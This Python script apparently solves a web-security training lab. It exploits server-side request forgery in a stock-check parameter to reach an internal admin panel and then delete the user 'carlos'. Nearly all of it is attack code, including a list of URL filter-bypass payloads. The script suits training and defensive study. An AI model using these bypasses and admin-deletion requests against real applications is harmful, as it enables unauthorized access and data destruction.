#!/usr/bin/python3

import requests
import sys

# URL Encoded Special Char
s_1 = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in "@")
s_2 = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in "#")

domains = [
    # "http://domain@127.0.0.1",
    # "http://127.0.0.1#domain",
    # "http://domain.127.0.0.1",
    # "http://127.0.0.1/domain",
    # "http://127.0.0.1/?d=domain",
    # "http://domain@localhost",
    # "http://localhost#domain",
    # "http://domain.localhost",
    # "http://localhost/domain",
    # "http://localhost/?d=domain",
    # "http://127.0.0.1$00domain",
    # "http://127.0.0.1///domain",
    # "http://127.0.0.1?domain",
    # "http://localhost$00domain",
    # "http://localhost///domain",
    # "http://localhost?domain",
    # "http://localhost$domain",
    "http://domain/127.0.0.1",
    "http://localhost@domain",
    f"http://localhost{s_1}domain",
    f"http://localhost{s_2}@domain", # URL encoded "#" + @ worked
]

def ssrfToAdmin(url, api, endpoint):

    for i in domains:
        admin_url = i.replace("domain", "stock.weliketoshop.net")
        payload = admin_url + "/" + endpoint

        data = {
            "stockApi" : payload,
        }

        r = requests.post(url + api, data=data)

        if r.status_code == 200:
            print("[INFO] SSRF successful admin page granted!")
            print(f"[INFO] Payload: {payload}")
        else:
            pass

    return payload

def deleteUser(url, api, payload):

    username = "carlos"

    data = {
        "stockApi" : f"{payload}/delete?username={username}"
    }

    r = requests.post(url + api, data = data)
    
    if r.status_code == 401:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://ac3f1fb71eb5f9b2c0264e25002f0089.web-security-academy.net"
    api = "/product/stock"
    endpoint = "admin"

    payload = ssrfToAdmin(url, api, endpoint)
    deleteUser(url, api, payload)
